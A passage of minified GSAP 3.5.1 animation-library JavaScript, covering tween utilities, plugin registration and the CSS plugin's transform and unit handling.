r(e,0,{immediateRender:!1,lazy:!1,overwrite:!1,delay:t,onComplete:e,onReverseComplete:e,onCompleteParams:i,onReverseCompleteParams:i,callbackScope:n})},r.fromTo=function(t,e,i){return new r(t,_(arguments,2))},r.set=function(t,e){return e.duration=0,e.repeatDelay||(e.repeat=0),new r(t,e)},r.killTweensOf=function(t,e,i){return ft.killTweensOf(t,e,i)},r}(De);function qe(t,e,i){return t.setAttribute(e,i)}function Xe(t,e,i,n){n.mSet(t,e,n.m.call(n.tween,i,n.mt),n)}C(We.prototype,{_targets:[],_lazy:0,_startAt:0,_op:0,_onInit:0}),x("staggerTo,staggerFrom,staggerFromTo",(function(t){We[t]=function(){var e=new ke,i=ge.call(arguments,0);return i.splice("staggerFromTo"===t?5:4,0,0),e[t].apply(e,i)}}));var Ye=function(t,e,i){return t[e]=i},$e=function(t,e,i){return t[e](i)},Ze=function(t,e,i,n){return t[e](n.fp,i)},Je=function(t,e){return r(t[e])?$e:o(t[e])&&t.setAttribute?qe:Ye},Ke=function(t,e){return e.set(e.t,e.p,Math.round(1e4*(e.s+e.c*t))/1e4,e)},Qe=function(t,e){return e.set(e.t,e.p,!!(e.s+e.c*t),e)},ti=function(t,e){var i=e._pt,n="";if(!t&&e.b)n=e.b;else if(1===t&&e.e)n=e.e;else{for(;i;)n=i.p+(i.m?i.m(i.s+i.c*t):Math.round(1e4*(i.s+i.c*t))/1e4)+n,i=i._next;n+=e.c}e.set(e.t,e.p,n,e)},ei=function(t,e){for(var i=e._pt;i;)i.r(t,i.d),i=i._next},ii=function(t,e,i,n){for(var r,a=this._pt;a;)r=a._next,a.p===n&&a.modifier(t,e,i),a=r},ni=function(t){for(var e,i,n=this._pt;n;)i=n._next,n.p===t&&!n.op||n.op===t?O(this,n,"_pt"):n.dep||(e=1),n=i;return!e},ri=function(t){for(var e,i,n,r,a=t._pt;a;){for(e=a._next,i=n;i&&i.pr>a.pr;)i=i._next;(a._prev=i?i._prev:r)?a._prev._next=a:n=a,(a._next=i)?i._prev=a:r=a,a=e}t._pt=n},ai=(oi.prototype.modifier=function(t,e,i){this.mSet=this.mSet||this.set,this.set=Xe,this.m=t,this.mt=i,this.tween=e},oi);function oi(t,e,i,n,r,a,o,s,l){this.t=e,this.s=n,this.c=r,this.p=i,this.r=a||Ke,this.d=o||this,this.set=s||Ye,this.pr=l||0,(this._next=t)&&(t._prev=this)}x(ue+"parent,duration,ease,delay,overwrite,runBackwards,startAt,yoyo,immediateRender,repeat,repeatDelay,data,paused,reversed,lazy,callbackScope,stringFilter,id,yoyoEase,stagger,inherit,repeatRefresh,keyframes,autoRevert,scrollTrigger",(function(t){return re[t]=1})),ne.TweenMax=ne.TweenLite=We,ne.TimelineLite=ne.TimelineMax=ke,ft=new ke({sortChildren:!1,defaults:Ht,autoRemoveChildren:!0,id:"root",smoothChildTiming:!0}),Ft.stringFilter=lt;var si={registerPlugin:function(){for(var t=arguments.length,e=new Array(t),i=0;i<t;i++)e[i]=arguments[i];e.forEach((function(t){return function(t){var e=(t=!t.name&&t.default||t).name,i=r(t),n=e&&!i&&t.init?function(){this._props=[]}:t,a={init:m,render:ei,add:He,kill:ni,modifier:ii,rawVars:0},o={targetTest:0,get:0,getSetter:Je,aliases:{},register:0};if(Te(),t!==n){if(se[e])return;C(n,C(P(t,a),o)),de(n.prototype,de(a,P(t,o))),se[n.prop=e]=n,t.targetTest&&(he.push(n),re[e]=1),e=("css"===e?"CSS":e.charAt(0).toUpperCase()+e.substr(1))+"Plugin"}f(e,n),t.register&&t.register(hi,n,ai)}(t)}))},timeline:function(t){return new ke(t)},getTweensOf:function(t,e){return ft.getTweensOf(t,e)},getProperty:function(t,e,i,r){n(t)&&(t=ve(t)[0]);var a=v(t||{}).get,o=i?E:T;return"native"===i&&(i=""),t?e?o((se[e]&&se[e].get||a)(t,e,i,r)):function(e,i,n){return o((se[e]&&se[e].get||a)(t,e,i,n))}:t},quickSetter:function(t,e,i){if(1<(t=ve(t)).length){var n=t.map((function(t){return hi.quickSetter(t,e,i)})),r=n.length;return function(t){for(var e=r;e--;)n[e](t)}}t=t[0]||{};var a=se[e],o=v(t),s=o.harness&&(o.harness.aliases||{})[e]||e,l=a?function(e){var n=new a;wt._pt=0,n.init(t,i?e+i:e,wt,0,[t]),n.render(1,n),wt._pt&&ei(1,wt)}:o.set(t,s);return a?l:function(e){return l(t,s,i?e+i:e,o,1)}},isTweening:function(t){return 0<ft.getTweensOf(t,!0).length},defaults:function(t){return t&&t.ease&&(t.ease=Pe(t.ease,Ht.ease)),L(Ht,t||{})},config:function(t){return L(Ft,t||{})},registerEffect:function(t){var e=t.name,i=t.effect,n=t.plugins,r=t.defaults,a=t.extendTimeline;(n||"").split(",").forEach((function(t){return t&&!se[t]&&!ne[t]&&p(e+" effect requires "+t+" plugin.")})),le[e]=function(t,e,n){return i(ve(t),C(e||{},r),n)},a&&(ke.prototype[e]=function(t,i,n){return this.add(le[e](t,s(i)?i:(n=i)&&{},this),n)})},registerEase:function(t,e){Ee[t]=Pe(e)},parseEase:function(t,e){return arguments.length?Pe(t,e):Ee},getById:function(t){return ft.getById(t)},exportRoot:function(t,e){void 0===t&&(t={});var i,n,r=new ke(t);for(r.smoothChildTiming=l(t.smoothChildTiming),ft.remove(r),r._dp=0,r._time=r._tTime=ft._time,i=ft._first;i;)n=i._next,!e&&!i._dur&&i instanceof We&&i.vars.onComplete===i._targets[0]||H(r,i,i._start-i._delay),i=n;return H(ft,r,0),r},utils:{wrap:function t(e,i,n){var r=i-e;return Zt(e)?tt(e,t(0,e.length),i):q(n,(function(t){return(r+(t-e)%r)%r+e}))},wrapYoyo:function t(e,i,n){var r=i-e,a=2*r;return Zt(e)?tt(e,t(0,e.length-1),i):q(n,(function(t){return e+(r<(t=(a+(t-e)%a)%a||0)?a-t:t)}))},distribute:Z,random:Q,snap:K,normalize:function(t,e,i){return ye(t,e,0,1,i)},getUnit:X,clamp:function(t,e,i){return q(i,(function(i){return me(t,e,i)}))},splitColor:at,toArray:ve,mapRange:ye,pipe:function(){for(var t=arguments.length,e=new Array(t),i=0;i<t;i++)e[i]=arguments[i];return function(t){return e.reduce((function(t,e){return e(t)}),t)}},unitize:function(t,e){return function(i){return t(parseFloat(i))+(e||X(i))}},interpolate:function t(e,i,r,a){var o=isNaN(e+i)?0:function(t){return(1-t)*e+t*i};if(!o){var s,l,c,h,u,d=n(e),p={};if(!0===r&&(a=1)&&(r=null),d)e={p:e},i={p:i};else if(Zt(e)&&!Zt(i)){for(c=[],h=e.length,u=h-2,l=1;l<h;l++)c.push(t(e[l-1],e[l]));h--,o=function(t){t*=h;var e=Math.min(u,~~t);return c[e](t-e)},r=i}else a||(e=de(Zt(e)?[]:{},e));if(!c){for(s in i)He.call(p,e,s,"get",i[s]);o=function(t){return ei(t,p)||(d?e.p:e)}}}return q(r,o)},shuffle:$},install:u,effects:le,ticker:Se,updateRoot:ke.updateRoot,plugins:se,globalTimeline:ft,core:{PropTween:ai,globals:f,Tween:We,Timeline:ke,Animation:De,getCache:v,_removeLinkedListItem:O}};function li(t,e){for(var i=t._pt;i&&i.p!==e&&i.op!==e&&i.fp!==e;)i=i._next;return i}function ci(t,e){return{name:t,rawVars:1,init:function(t,i,r){r._onInit=function(t){var r,a;if(n(i)&&(r={},x(i,(function(t){return r[t]=1})),i=r),e){for(a in r={},i)r[a]=e(i[a]);i=r}!function(t,e){var i,n,r,a=t._targets;for(i in e)for(n=a.length;n--;)(r=(r=t._ptLookup[n][i])&&r.d)&&(r._pt&&(r=li(r,i)),r&&r.modifier&&r.modifier(e[i],t,a[n],i))}(t,i)}}}}x("to,from,fromTo,delayedCall,set,killTweensOf",(function(t){return si[t]=We[t]})),Se.add(ke.updateRoot),wt=si.to({},{duration:0});var hi=si.registerPlugin({name:"attr",init:function(t,e,i,n,r){var a,o;for(a in e)(o=this.add(t,"setAttribute",(t.getAttribute(a)||0)+"",e[a],n,r,0,0,a))&&(o.op=a),this._props.push(a)}},{name:"endArray",init:function(t,e){for(var i=e.length;i--;)this.add(t,i,t[i]||0,e[i])}},ci("roundProps",J),ci("modifiers"),ci("snap",K))||si;function ui(t,e){return e.set(e.t,e.p,Math.round(1e4*(e.s+e.c*t))/1e4+e.u,e)}function di(t,e){return e.set(e.t,e.p,1===t?e.e:Math.round(1e4*(e.s+e.c*t))/1e4+e.u,e)}function pi(t,e){return e.set(e.t,e.p,t?Math.round(1e4*(e.s+e.c*t))/1e4+e.u:e.b,e)}function fi(t,e){var i=e.s+e.c*t;e.set(e.t,e.p,~~(i+(i<0?-.5:.5))+e.u,e)}function mi(t,e){return e.set(e.t,e.p,t?e.e:e.b,e)}function gi(t,e){return e.set(e.t,e.p,1!==t?e.b:e.e,e)}function vi(t,e,i){return t.style[e]=i}function yi(t,e,i){return t.style.setProperty(e,i)}function xi(t,e,i){return t._gsap[e]=i}function bi(t,e,i){return t._gsap.scaleX=t._gsap.scaleY=i}function wi(t,e,i,n,r){var a=t._gsap;a.scaleX=a.scaleY=i,a.renderTransform(r,a)}function _i(t,e,i,n,r){var a=t._gsap;a[e]=i,a.renderTransform(r,a)}function Mi(t,e){var i=Wi.createElementNS?Wi.createElementNS((e||"http://www.w3.org/1999/xhtml").replace(/^https/,"http"),t):Wi.createElement(t);return i.style?i:Wi.createElement(t)}function Si(t,e,i){var n=getComputedStyle(t);return n[e]||n.getPropertyValue(e.replace(wn,"-$1").toLowerCase())||n.getPropertyValue(e)||!i&&Si(t,An(e)||e,1)||""}function Ti(){"undefined"!=typeof window&&window.document&&(Vi=window,Wi=Vi.document,qi=Wi.documentElement,Yi=Mi("div")||{style:{}},$i=Mi("div"),Tn=An(Tn),En=Tn+"Origin",Yi.style.cssText="border-width:0;line-height:0;position:absolute;padding:0",Ji=!!An("perspective"),Xi=1)}function Ei(t){var e,i=Mi("svg",this.ownerSVGElement&&this.ownerSVGElement.getAttribute("xmlns")||"http://www.w3.org/2000/svg"),n=this.parentNode,r=this.nextSibling,a=this.style.cssText;if(qi.appendChild(i),i.appendChild(this),this.style.display="block",t)try{e=this.getBBox(),this._gsapBBox=this.getBBox,this.getBBox=Ei}catch(t){}else this._gsapBBox&&(e=this._gsapBBox());return n&&(r?n.insertBefore(this,r):n.appendChild(this)),qi.removeChild(i),this.style.cssText=a,e}function Ci(t,e){for(var i=e.length;i--;)if(t.hasAttribute(e[i]))return t.getAttribute(e[i])}function Ai(t){var e;try{e=t.getBBox()}catch(i){e=Ei.call(t,!0)}return e&&(e.width||e.height)||t.getBBox===Ei||(e=Ei.call(t,!0)),!e||e.width||e.x||e.y?e:{x:+Ci(t,["x","cx","x1"])||0,y:+Ci(t,["y","cy","y1"])||0,width:0,height:0}}function Li(t){return!(!t.getCTM||t.parentNode&&!t.ownerSVGElement||!Ai(t))}function Pi(t,e){if(e){var i=t.style;e in vn&&e!==En&&(e=Tn),i.removeProperty?("ms"!==e.substr(0,2)&&"webkit"!==e.substr(0,6)||(e="-"+e),i.removeProperty(e.replace(wn,"-$1").toLowerCase())):i.removeAttribute(e)}}function Ri(t,e,i,n,r,a){var o=new ai(t._pt,e,i,0,1,a?gi:mi);return(t._pt=o).b=n,o.e=r,t._props.push(i),o}function Oi(t,e,i,n){var r,a,o,s,l=parseFloat(i)||0,c=(i+"").trim().substr((l+"").length)||"px",h=Yi.style,u=_n.test(e),d="svg"===t.tagName.toLowerCase(),p=(d?"client":"offset")+(u?"Width":"Height"),f="px"===n,m="%"===n;return n===c||!l||Ln[n]||Ln[c]?l:("px"===c||f||(l=Oi(t,e,i,"px")),s=t.getCTM&&Li(t),m&&(vn[e]||~e.indexOf("adius"))?b(l/(s?t.getBBox()[u?"width":"height"]:t[p])*100):(h[u?"width":"height"]=100+(f?c:n),a=~e.indexOf("adius")||"em"===n&&t.appendChild&&!d?t:t.parentNode,s&&(a=(t.ownerSVGElement||{}).parentNode),a&&a!==Wi&&a.appendChild||(a=Wi.body),(o=a._gsap)&&m&&o.width&&u&&o.time===Se.time?b(l/o.width*100):(!m&&"%"!==c||(h.position=Si(t,"position")),a===t&&(h.position="static"),a.appendChild(Yi),r=Yi[p],a.removeChild(Yi),h.position="absolute",u&&m&&((o=v(a)).time=Se.time,o.width=a[p]),b(f?r*l/100:r&&l?100/r*l:0))))}function Ii(t,e,i,n){var r;return Xi||Ti(),e in Sn&&"transform"!==e&&~(e=Sn[e]).indexOf(",")&&(e=e.split(",")[0]),vn[e]&&"transform"!==e?(r=zn(t,n),r="transformOrigin"!==e?r[e]:Dn(Si(t,En))+" "+r.zOrigin+"px"):(r=t.style[e])&&"auto"!==r&&!n&&!~(r+"").indexOf("calc(")||(r=Rn[e]&&Rn[e](t,e,i)||Si(t,e)||y(t,e)||("opacity"===e?1:0)),i&&!~(r+"").indexOf(" ")?Oi(t,e,r,i)+i:r}function zi(t,e,i,n){if(!i||"none"===i){var r=An(e,t,1),a=r&&Si(t,r,1);a&&a!==i?(e=r,i=a):"borderColor"===e&&(i=Si(t,"borderTopColor"))}var o,s,l,c,h,u,d,p,f,m,g,v,y=new ai(this._pt,t.style,e,0,1,ti),x=0,b=0;if(y.b=i,y.e=n,i+="","auto"==(n+="")&&(t.style[e]=n,n=Si(t,e)||n,t.style[e]=i),lt(o=[i,n]),n=o[1],l=(i=o[0]).match(Qt)||[],(n.match(Qt)||[]).length){for(;s=Qt.exec(n);)d=s[0],f=n.substring(x,s.index),h?h=(h+1)%5:"rgba("!==f.substr(-5)&&"hsla("!==f.substr(-5)||(h=1),d!==(u=l[b++]||"")&&(c=parseFloat(u)||0,g=u.substr((c+"").length),(v="="===d.charAt(1)?+(d.charAt(0)+"1"):0)&&(d=d.substr(2)),p=parseFloat(d),m=d.substr((p+"").length),x=Qt.lastIndex-m.length,m||(m=m||Ft.units[e]||g,x===n.length&&(n+=m,y.e+=m)),g!==m&&(c=Oi(t,e,u,m)||0),y._pt={_next:y._pt,p:f||1===b?f:",",s:c,c:v?v*p:p-c,m:h&&h<4?Math.round:0});y.c=x<n.length?n.substring(x,n.length):""}else y.r="display"===e&&"none"===n?gi:mi;return ee.test(n)&&(y.e=0),this._pt=y}function Di(t){var e=t.split(" "),i=e[0],n=e[1]||"50%";return"top"!==i&&"bottom"!==i&&"left"!==n&&"right"!==n||(t=i,i=n,n=t),e[0]=Pn[i]||i,e[1]=Pn[n]||n,e.join(" ")}function Ni(t,e){if(e.tween&&e.tween._time===e.tween._dur){var i,n,r,a=e.t,o=a.style,s=e.u,l=a._gsap;if("all"===s||!0===s)o.cssText="",n=1;else for(r=(s=s.split(",")).length;-1<--r;)i=s[r],vn[i]&&(n=1,i="transformOrigin"===i?En:Tn),Pi(a,i);n&&(Pi(a,Tn),l&&(l.svg&&a.removeAttribute("transform"),zn(a,1),l.uncache=1))}}function ki(t){return"matrix(1, 0, 0, 1, 0, 0)"===t||"none"===t||!t}function Bi(t){var e=Si(t,Tn);return ki(e)?On:e.substr(7).match(Kt).map(b)}function Fi(t,e){var i,n,r,a,o=t._gsap||v(t),s=t.style,l=Bi(t);return o.svg&&t.getAttribute("transform")?"1,0,0,1,0,0"===(l=[(r=t.transform.baseVal.consolidate().matrix).a,r.b,r.c,r.d,r.e,r.f]).join(",")?On:l:(l!==On||t.offsetParent||t===qi||o.svg||(r=s.display,s.display="block",(i=t.parentNode)&&t.offsetParent||(a=1,n=t.nextSibling,qi.appendChild(t)),l=Bi(t),r?s.display=r:Pi(t,"display"),a&&(n?i.insertBefore(t,n):i?i.appendChild(t):qi.removeChild(t))),e&&6<l.length?[l[0],l[1],l[4],l[5],l[12],l[13]]:l)}function Hi(t,e,i,n,r,a){var o,s,l,c=t._gsap,h=r||Fi(t,!0),u=c.xOrigin||0,d=c.yOrigin||0,p=c.xOffset||0,f=c.yOffset||0,m=h[0],g=h[1],v=h[2],y=h[3],x=h[4],b=h[5],w=e.split(" "),_=parseFloat(w[0])||0,M=parseFloat(w[1])||0;i?h!==On&&(s=m*y-g*v)&&(l=_*(-g/s)+M*(m/s)-(m*b-g*x)/s,_=_*(y/s)+M*(-v/s)+(v*b-y*x)/s,M=l):(_=(o=Ai(t)).x+(~w[0].indexOf("%")?_/100*o.width:_),M=o.y+(~(w[1]||w[0]).indexOf("%")?M/100*o.height:M)),n||!1!==n&&c.smooth?(x=_-u,b=M-d,c.xOffset=p+(x*m+b*v)-x,c.yOffset=f+(x*g+b*y)-b):c.xOffset=c.yOffset=0,c.xOrigin=_,c.yOrigin=M,c.smooth=!!n,c.origin=e,c.originIsAbsolute=!!i,t.style[En]="0px 0px",a&&(Ri(a,c,"xOrigin",u,_),Ri(a,c,"yOrigin",d,M),Ri(a,c,"xOffset",p,c.xOffset),Ri(a,c,"yOffset",f,c.yOffset)),t.setAttribute("data-svg-origin",_+" "+M)}function Gi(t,e,i){var n=X(e);return b(parseFloat(e)+parseFloat(Oi(t,"x",i+"px",n)))+n}function ji(t,e,i,r,a,o){var s,l,c=360,h=n(a),u=parseFloat(a)*(h&&~a.indexOf("rad")?yn:1),d=o?u*o:u-r,p=r+d+"deg";return h&&("short"===(s=a.split("_")[1])&&(d%=c)!=d%180&&(d+=d<0?c:-c),"cw"===s&&d<0?d=(d+36e9)%c-~~(d/c)*c:"ccw"===s&&0<d&&(d=(d-36e9)%c-~~(d/c)*c)),t._pt=l=new ai(t._pt,e,i,r,d,di),l.e=p,l.u="deg",t._props.push(i),l}function Ui(t,e,i){var n,r,a,o,s,l,c,h=$i.style,u=i._gsap;for(r in h.cssText=getComputedStyle(i).cssText+";position:absolute;display:block;",h[Tn]=e,Wi.body.appendChild($i),n=zn($i,1),vn)(a=u[r])!==(o=n[r])&&"perspective,force3D,transformOrigin,svgOrigin".indexOf(r)<0&&(s=X(a)!==(c=X(o))?Oi(i,r,a,c):parseFloat(a),l=parseFloat(o),t._pt=new ai(t._pt,u,r,s,l-s,ui),t._pt.u=c||0,t._props.push(r));Wi.body.removeChild($i)}We.version=ke.version=hi.version="3.5.1",xt=1,c()&&Te();var Vi,Wi,qi,Xi,Yi,$i,Zi,Ji,Ki=Ee.Power0,Qi=Ee.Power1,tn=Ee.Power2,en=Ee.Power3,nn=Ee.Power4,rn=Ee.Linear,an=Ee.Quad,on=Ee.Cubic,sn=Ee.Quart,ln=Ee.Quint,cn=Ee.Strong,hn=Ee.Elastic,un=Ee.Back,dn=Ee.SteppedEase,pn=Ee.Bounce,fn=Ee.Sine,mn=Ee.Expo,gn=Ee.Circ,vn={},yn=180/Math.PI,xn=Math.PI/180,bn=Math.atan2,wn=/([A-Z])/g,_n=/(?:left|right|width|margin|padding|x)/i,Mn=/[\s,\(]\S/,Sn={autoAlpha:"opacity,visibility",scale:"scaleX,scaleY",alpha:"opacity"},Tn="transform",En=Tn+"Origin",Cn="O,Moz,ms,Ms,Webkit".split(","),An=function(t,e,i){var n=(e||Yi).style,r=5;if(t in n&&!i)return t;for(t=t.charAt(0).toUpperCase()+t.substr(1);r--&&!(Cn[r]+t in n););return r<0?null:(3===r?"ms":0<=r?Cn[r]:"")+t},Ln={deg:1,rad:1,turn:1},Pn={top:"0%",bottom:"100%",left:"0%",right:"100%",center:"50%"},Rn={clearProps:function(t,e,i,n,r){if("isFromStart"!==r.data){var a=t._pt=new ai(t._pt,e,i,0,0,Ni);return a.u=n,a.pr=-10,a.tween=r,t._props.push(i),1}}},On=[1,0,0,1,0,0],In={},zn=function(t,e){var i=t._gsap||new ze(t);if("x"in i&&!e&&!i.uncache)return i;var n,r,a,o,s,l,c,h,u,d,p,f,m,g,v,y,x,w,_,M,S,T,E,C,A,L,P,R,O,I,z,D,N=t.style,k=i.scaleX<0,B="deg",F=Si(t,En)||"0";return n=r=a=l=c=h=u=d=p=0,o=s=1,i.svg=!(!t.getCTM||!Li(t)),g=Fi(t,i.svg),i.svg&&(C=!i.uncache&&t.getAttribute("data-svg-origin"),Hi(t,C||F,!!C||i.originIsAbsolute,!1!==i.smooth,g)),f=i.xOrigin||0,m=i.yOrigin||0,g!==On&&(w=g[0],_=g[1],M=g[2],S=g[3],n=T=g[4],r=E=g[5],6===g.length?(o=Math.sqrt(w*w+_*_),s=Math.sqrt(S*S+M*M),l=w||_?bn(_,w)*yn:0,(u=M||S?bn(M,S)*yn+l:0)&&(s*=Math.cos(u*xn)),i.svg&&(n-=f-(f*w+m*M),r-=m-(f*_+m*S))):(D=g[6],I=g[7],P=g[8],R=g[9],O=g[10],z=g[11],n=g[12],r=g[13],a=g[14],c=(v=bn(D,O))*yn,v&&(C=T*(y=Math.cos(-v))+P*(x=Math.sin(-v)),A=E*y+R*x,L=D*y+O*x,P=T*-x+P*y,R=E*-x+R*y,O=D*-x+O*y,z=I*-x+z*y,T=C,E=A,D=L),h=(v=bn(-M,O))*yn,v&&(y=Math.cos(-v),z=S*(x=Math.sin(-v))+z*y,w=C=w*y-P*x,_=A=_*y-R*x,M=L=M*y-O*x),l=(v=bn(_,w))*yn,v&&(C=w*(y=Math.cos(v))+_*(x=Math.sin(v)),A=T*y+E*x,_=_*y-w*x,E=E*y-T*x,w=C,T=A),c&&359.9<Math.abs(c)+Math.abs(l)&&(c=l=0,h=180-h),o=b(Math.sqrt(w*w+_*_+M*M)),s=b(Math.sqrt(E*E+D*D)),v=bn(T,E),u=2e-4<Math.abs(v)?v*yn:0,p=z?1/(z<0?-z:z):0),i.svg&&(C=t.getAttribute("transform"),i.forceCSS=t.setAttribute("transform","")||!ki(Si(t,Tn)),C&&t.setAttribute("transform",C))),90<Math.abs(u)&&Math.abs(u)<270&&(k?(o*=-1,u+=l<=0?180:-180,l+=l<=0?180:-180):(s*=-1,u+=u<=0?180:-180)),i.x=((i.xPercent=n&&Math.round(t.offsetWidth/2)===Math.round(-n)?-50:0)?0:n)+"px",i.y=((i.yPercent=r&&Math.round(t.offsetHeight/2)===Math.round(-r)?-50:0)?0:r)+"px",i.z=a+"px",i.scaleX=b(o),i.scaleY=b(s),i.rotation=b(l)+B,i.rotationX=b(c)+B,i.rotationY=b(h)+B,i.skewX=u+B,i.skewY=d+B,i.transformPerspective=p+"px",(i.zOrigin=parseFloat(F.split(" ")[2])||0)&&(N[En]=Dn(F)),i.xOffset=i.yOffset=0,i.force3D=Ft.force3D,i.renderTransform=i.svg?Gn:Ji?Hn:Nn,i.uncache=0,i},Dn=function(t){return(t=t.split(" "))[0]+" "+t[1]},Nn=function(t,e){e.z="0px",e.rotationY=e.rotationX="0deg",e.force3D=0,Hn(t,e)},kn="0deg",Bn="0px",Fn=") ",Hn=function(t,e){var i=e||this,n=i.xPercent,r=i.yPercent,a=i.x,o=i.y,s=i.z,l=i.rotation,c=i.rotationY,h=i.rotationX,u=i.skewX,d=i.skewY,p=i.scaleX,f=i.scaleY,m=i.transformPerspective,g=i.force3D,v=i.target,y=i.zOrigin,x="",b="auto"===g&&t&&1!==t||!0===g;if(y&&(h!==kn||c!==kn)){var w,_=parseFloat(c)*xn,M=Math.sin(_),S=Math.cos(_);_=parseFloat(h)*xn,a=Gi(v,a,M*(w=Math.cos(_))*-y),o=Gi(v,o,-Math.sin(_)*-y),s=Gi(v,s,S*w*-y+y)}m!==Bn&&(x+="perspective("+m+Fn),(n||r)&&(x+="translate("+n+"%, "+r+"%) "),!b&&a===Bn&&o===Bn&&s===Bn||(x+=s!==Bn||b?"translate3d("+a+", "+o+", "+s+") ":"translate("+a+", "+o+Fn),l!==kn&&(x+="rotate("+l+Fn),c!==kn&&(x+="rotateY("+c+Fn),h!==kn&&(x+="rotateX("+h+Fn),u===kn&&d===kn||(x+="skew("+u+", "+d+Fn),1===p&&1===f||(x+="scale("+p+", "+f+Fn),v.style[Tn]=x||"translate(0, 0)"},Gn=function(t,e){var i,n,r,a,o,s=e||this,l=s.xPercent,c=s.yPercent,h=s.x,u=s.y,d=s.rotation,p=s.skewX,f=s.skewY,m=s.scaleX,g=s.scaleY,v=s.target,y=s.xOrigin,x=s.yOrigin,w=s.xOffset,_=s.yOffset,M=s.forceCSS,S=parseFloat(h),T=parseFloat(u);d=parseFloat(d),p=parseFloat(p),(f=parseFloat(f))&&(p+=f=parseFloat(f),d+=f),d||p?(d*=xn,p*=xn,i=Math.cos(d)*m,n=Math.sin(d)*m,r=Math.sin(d-p)*-g,a=Math.cos(d-p)*g,p&&(f*=xn,o=Math.tan(p-f),r*=o=Math.sqrt(1+o*o),a*=o,f&&(o=Math.tan(f),i*=o=Math.sqrt(1+o*o),n*=o)),i=b(i),n=b(n),r=b(r),a=b(a)):(i=m,a=g,n=r=0),(S&&!~(h+"").indexOf("px")||T&&!~(u+"").indexOf("px"))&&(S=Oi(v,"x",h,"px"),T=Oi(v,"y",u,"px")),(y||x||w||_)&&(S=b(S+y-(y*i+x*r)+w),T=b(T+x-(y*n+x*a)+_)),(l||c)&&(S=b(S+l/100*(o=v.getBBox()).width),T=b(T+c/100*o.height)),o="matrix("+i+","+n+","+r+","+a+","+S+","+T+")",v.setAttribute("transform",o),M&&(v.style[Tn]=o)};x("padding,margin,Width,Radius",(function(t,e){var i="Right",n="Bottom",r="Left",a=(e<3?["Top",i,n,r]:["Top"+r,"Top"+i,n+i,n+r]).map((function(i){return e<2?t+i:"border"+i+t}));Rn[1<e?"border"+t:t]=function(t,e,i,n,r){var o,s;if(arguments.length<4)return o=a.map((function(e){return Ii(t,e,i)})),5===(s=o.join(" ")).split(o[0]).length?o[0]:s;o=(n+"").split(" "),s={},a.forEach((function(t,e){return s[t]=o[e]=o[e]||o[(e-1)/2|0]})),t.init(e,s,r)}}));var jn,Un,Vn={name:"css",register:Ti,targetTest:function(t){return t.style&&t.nodeType},init:function(t,e,i,n,r){var a,o,s,l,c,h,u,p,f,m,g,v,y,x,b,w=this._props,_=t.style;for(u in Xi||Ti(),e)if("autoRound"!==u&&(o=e[u],!se[u]||!Be(u,e,i,n,t,r)))if(c=typeof o,h=Rn[u],"function"===c&&(c=typeof(o=o.call(i,n,t,r))),"string"===c&&~o.indexOf("random(")&&(o=et(o)),h)h(this,t,u,o,i)&&(b=1);else if("--"===u.substr(0,2))this.add(_,"setProperty",getComputedStyle(t).getPropertyValue(u)+"",o+"",n,r,0,0,u);else if("undefined"!==c){if(a=Ii(t,u),l=parseFloat(a),(m="string"===c&&"="===o.charAt(1)?+(o.charAt(0)+"1"):0)&&(o=o.substr(2)),s=parseFloat(o),u in Sn&&("autoAlpha"===u&&(1===l&&"hidden"===Ii(t,"visibility")&&s&&(l=0),Ri(this,_,"visibility",l?"inherit":"hidden",s?"inherit":"hidden",!s)),"scale"!==u&&"transform"!==u&&~(u=Sn[u]).indexOf(",")&&(u=u.split(",")[0])),g=u in vn)if(v||((y=t._gsap).renderTransform||zn(t),x=!1!==e.smoothOrigin&&y.smooth,(v=this._pt=new ai(this._pt,_,Tn,0,1,y.renderTransform,y,0,-1)).dep=1),"scale"===u)this._pt=new ai(this._pt,y,"scaleY",y.scaleY,m?m*s:s-y.scaleY),w.push("scaleY",u),u+="X";else{if("transformOrigin"===u){o=Di(o),y.svg?Hi(t,o,0,x,0,this):((f=parseFloat(o.split(" ")[2])||0)!==y.zOrigin&&Ri(this,y,"zOrigin",y.zOrigin,f),Ri(this,_,u,Dn(a),Dn(o)));continue}if("svgOrigin"===u){Hi(t,o,1,x,0,this);continue}if(u in In){ji(this,y,u,l,o,m);continue}if("smoothOrigin"===u){Ri(this,y,"smooth",y.smooth,o);continue}if("force3D"===u){y[u]=o;continue}if("transform"===u){Ui(this,o,t);continue}}else u in _||(u=An(u)||u);if(g||(s||0===s)&&(l||0===l)&&!Mn.test(o)&&u in _)s=s||0,(p=(a+"").substr((l+"").length))!==(f=X(o)||(u in Ft.units?Ft.units[u]:p))&&(l=Oi(t,u,a,f)),this._pt=new ai(this._pt,g?y:_,u,l,m?m*s:s-l,"px"!==f||!1===e.autoRound||g?ui:fi),this._pt.u=f||0,p!==f&&(this._pt.b=a,this._pt.r=pi);else if(u in _)zi.call(this,t,u,a,o);else{if(!(u in t)){d(u,o);continue}this.add(t,u,t[u],o,n,r)}w.push(u)}b&&ri(this)},get:Ii,aliases:Sn,getSetter:function(t,e,i){var n=Sn[e];return n&&n.indexOf(",")<0&&(e=n),e in vn&&e!==En&&(t._gsap.x||Ii(t,"x"))?i&&Zi===i?"scale"===e?bi:xi:(Zi=i||{})&&("scale"===e?wi:_i):t.style&&!o(t.style[e])?vi:~e.indexOf("-")?yi:Je(t,e)},core:{_removeProperty:Pi,_getMatrix:Fi}};hi.utils.checkPrefix=An,Un=x("x,y,z,scale,scaleX,scaleY,xPercent,yPercent"+","+(jn="rotation,rotationX,rotationY,skewX,skewY")+",transform,transformOrigin,svgOrigin,force3D,smoothOrigin,transformPerspective",(function(t){vn[t]=1})),x(jn,(function(t){Ft.units[t]="deg",In[t]=1})),Sn[Un[13]]="x,y,z,scale,scaleX,scaleY,xPercent,yPercent,"+jn,x("0:translateX,1:translateY,2:translateZ,8:rotate,8:rotationZ,8:rotateZ,9:rotateX,10:rotateY",(function(t){var e=t.split(":");Sn[e[1]]=Un[e[0]]})),x("x,y,z,top,right,bottom,left,width,height,fontSize,padding,margin,perspective",(function(t){Ft.units[t]="px"})),hi.registerPlugin(Vn);var 